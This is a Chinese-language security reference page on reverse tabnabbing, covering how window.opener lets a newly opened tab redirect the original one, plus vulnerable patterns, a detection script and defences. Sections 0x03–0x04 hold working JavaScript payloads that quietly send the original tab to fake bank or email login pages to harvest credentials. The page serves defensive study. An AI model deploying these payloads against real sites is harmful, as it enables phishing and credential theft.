---
attack_surface: [客户端利用, 认证/授权绕过]
impact: [身份伪造, 信息泄露]
risk_level: 中
prerequisites:
  - HTML/JavaScript 基础
  - 浏览器 Tab/Window 打开机制
  - window.opener API
difficulty: 初级
related_techniques:
  - xss-cross-site-scripting
  - open-redirect
  - phishing
  - social-engineering
tools:
  - 浏览器 DevTools
---

# Reverse Tab Nabbing — 反向标签劫持

> 关联文档：[Open Redirect](../Open%20Redirect/README.md) · [XSS](../XSS/README.md) · [CRLF](../CRLF/README.md)

---

# 0x01 背景与原理

## 1.1 定义

Reverse Tab Nabbing（反向标签劫持）是一种利用 `target="_blank"` 链接将用户导航到攻击者页面后，通过 `window.opener` API 操纵**原始页面**的浏览器 Tab 行为，实现钓鱼或信息窃取。

**本质是**：当目标链接使用 `target="_blank"` 打开时，新页面可通过 `window.opener` 引用原页面的 `window` 对象，进而将原 Tab 导航到钓鱼页面。

## 1.2 攻击流程

```
1. 受害者访问含 target="_blank" 链接的合法页面
2. 受害者点击链接 → 新 Tab 打开攻击者页面
3. 攻击者页面 JS 执行: window.opener.location = "https://fake-target.com/login"
4. 受害者回到原 Tab → 看到伪造的登录页面
5. 受害者输入凭证 → 发送到攻击者服务器
```

## 1.3 window.opener 能力边界

| 可操作 | 不可操作 |
|--------|---------|
| `window.opener.location` (导航) | 读取 `window.opener.document.cookie` (受 SOP 限制) |
| `window.opener.location.replace()` | 读取原页面 DOM |
| `window.opener.close()` | 跨域访问 `localStorage` |
| `window.opener.postMessage()` | — |

> **关键点**：`window.opener.location` 是跨域可写的。攻击者虽不能读取原页面数据，但能**将原 Tab 导航到外观相同的钓鱼页面**。

---

# 0x02 漏洞条件与检测

## 2.1 触发条件

```html
<!-- 漏洞模式 1: 缺少 rel="noopener" -->
<a href="https://attacker.com" target="_blank">Click here</a>

<!-- 漏洞模式 2: 缺少 rel="noreferrer" -->
<form action="https://attacker.com" target="_blank">
  <input type="submit">
</form>

<!-- 漏洞模式 3: JS window.open() 未正确配置 -->
<script>
window.open('https://attacker.com');  // opener 仍然存在
</script>
```

## 2.2 安全模式

```html
<!-- 修复方案 1: rel="noopener" -->
<a href="https://example.com" target="_blank" rel="noopener noreferrer">Safe Link</a>

<!-- 修复方案 2: JS 断开 opener -->
<script>
const newWin = window.open('https://example.com');
newWin.opener = null;
</script>

<!-- 修复方案 3: Referrer-Policy -->
<!-- Referrer-Policy: no-referrer (同时阻止 referrer 泄露) -->
```

## 2.3 自动化检测

```javascript
// 检测页面是否存在不安全的 target="_blank"
const links = document.querySelectorAll('a[target="_blank"]');
links.forEach(link => {
  const rel = link.rel || '';
  if (!rel.includes('noopener') && !rel.includes('noreferrer')) {
    console.warn('[Tab Nabbing Risk]', link.href, link.outerHTML);
  }
});
```

---

# 0x03 攻击 Payload 与利用

## 3.1 基础导航劫持

```html
<!-- 攻击者页面 attacker.com/phish.html -->
<script>
if (window.opener) {
  // 将原 Tab 重定向到钓鱼页面
  window.opener.location = 'https://fake-victim.com/login';
}
</script>
```

## 3.2 延迟劫持（增强隐蔽性）

```html
<script>
if (window.opener) {
  // 延迟 3 秒 —— 受害者可能仍在查看新页面
  setTimeout(() => {
    window.opener.location = 'https://fake-victim.com/login';
  }, 3000);
}
</script>
```

## 3.3 条件劫持（Referrer 检查）

```html
<script>
if (window.opener && document.referrer) {
  // 仅劫持来自特定域的用户
  if (document.referrer.includes('victim-bank.com')) {
    window.opener.location = 'https://fake-bank.com/login';
  } else if (document.referrer.includes('victim-email.com')) {
    window.opener.location = 'https://fake-email.com/login';
  }
}
</script>
```

## 3.4 Phishing + Credential Harvesting

```html
<!-- 攻击者页面 -->
<script>
// 1. 劫持原 Tab
if (window.opener) {
  window.opener.location = 'https://victim.com.fake/phishing-login';
}

// 2. 新 Tab 伪装成 loading 页面
document.body.innerHTML = `
  <div style="text-align:center;margin-top:20%">
    <p>Redirecting, please wait...</p>
  </div>
`;

// 3. 自动关闭自身（增强迷惑性）
setTimeout(() => { window.close(); }, 1000);
</script>
```

---

# 0x04 变体与高级利用

## 4.1 Tabnabbing + Open Redirect

```html
<!-- 利用合法站点的开放重定向作为跳板 -->
<a href="https://victim.com/redirect?url=https://attacker.com" target="_blank">

<!-- 用户信任 victim.com 的链接，但最终到了 attacker.com -->
```

## 4.2 事件级 window.opener 持久化

```javascript
// 在新 Tab 持续监控 opener 状态
const monitor = setInterval(() => {
  if (window.opener && window.opener.closed) {
    // 原 Tab 已关闭 → 可能用户已完成操作
    clearInterval(monitor);
  }
  try {
    // 定期更新钓鱼页面 URL (防止用户发现)
    window.opener.location.replace('https://fake.com/updated');
  } catch(e) {}
}, 500);
```

## 4.3 多 Tab 攻击矩阵

```javascript
// 一次点击打开多个 Tab，同时劫持源 Tab
const tab1 = window.open('https://attacker.com/page1');
const tab2 = window.open('https://attacker.com/page2');
// tab1 & tab2 均可通过 window.opener 操纵原页面
```

---

# 0x05 防御措施

| 层级 | 措施 |
|------|------|
| **HTML 属性** | 所有 `target="_blank"` 添加 `rel="noopener noreferrer"` |
| **HTTP Header** | `Referrer-Policy: no-referrer` 阻止 Referrer 泄露 |
| **CSP** | `base-uri 'self'` 防止 `<base>` 劫持 |
| **JS 安全编码** | `window.open()` 后设置 `newWin.opener = null` |
| **COOP Header** | `Cross-Origin-Opener-Policy: same-origin` 彻底阻断跨域 opener 访问 |
| **Linter 规则** | ESLint `react/jsx-no-target-blank` 检测缺失的 `noopener` |

## 防御本质

> **Browsers have default `rel="noopener"` for `target="_blank"` since Chrome 88 (2021) and Firefox 79 (2020).** However, specific cases (anchor with no `rel`, dynamic `window.open()`) still require explicit protection.

---

# 0x06 漏洞挖掘清单

- [ ] 扫描所有 `target="_blank"` 的 `<a>` 标签，检查是否缺失 `rel="noopener"`
- [ ] 检查 `window.open()` 调用是否设有 `opener = null`
- [ ] 验证 COOP header 是否设置为 `same-origin`
- [ ] 测试 `<form target="_blank">` 是否产生 opener 引用
- [ ] 结合 Open Redirect 测试链式攻击

---

# 0x07 工具与参考

## 7.1 检测工具

| 工具 | 用途 |
|------|------|
| **ESLint react/jsx-no-target-blank** | React 代码静态分析 |
| **Lighthouse** | Chrome DevTools 审计 |
| **Burp Suite** | 被动扫描 `target="_blank"` |

## 7.2 参考资源

- [OWASP — Reverse Tabnabbing](https://owasp.org/www-community/attacks/Reverse_Tabnabbing)
- [PortSwigger — Reverse Tabnabbing](https://portswigger.net/web-security/reverse-tab-nabbing)
- [What is Tabnabbing (Palo Alto Networks)](https://unit42.paloaltonetworks.com/tabnabbing/)
- [A Security Analysis of target="_blank"](https://www.jitbit.com/alexblog/256-targetblank---the-most-underestimated-vulnerability-ever/)
